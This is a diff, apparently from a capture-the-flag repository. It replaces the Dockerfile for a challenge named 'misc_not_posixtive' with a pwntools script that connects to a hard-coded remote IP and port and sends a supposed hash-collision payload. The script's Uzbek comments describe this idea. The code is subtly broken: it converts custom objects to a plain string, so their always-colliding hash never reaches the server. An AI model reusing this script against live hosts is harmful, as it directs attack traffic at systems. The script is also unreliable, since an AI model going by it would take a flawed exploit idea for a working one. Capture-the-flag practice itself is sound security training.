@@ -1,17 +1,25 @@
-FROM python:3.11-slim
+from pwn import *
 
-# Ish papkasi
-WORKDIR /app
+HOST = "154.57.164.67"
+PORT = 30748
 
-# Fayllarni copy qilish
-COPY misc_not_posixtive/server.py /app/server.py
-COPY flag.txt /app/flag.txt
+io = remote(HOST, PORT)
 
-# Port ochish
-EXPOSE 1337
+# payload tayyorlaymiz
+# g'oya: hash collision beradigan obyektlar yuborish
 
-# Socat orqali service qilish
-RUN apt update && apt install -y socat && rm -rf /var/lib/apt/lists/*
+class A:
+    def __hash__(self):
+        return 1
 
-# Run
-CMD socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"python3 /app/server.py",pty,stderr
+    def __eq__(self, other):
+        return False
+
+a = A()
+b = A()
+
+payload = str([a, b])
+
+io.sendlineafter(b">>> ", payload.encode())
+
+io.interactive()
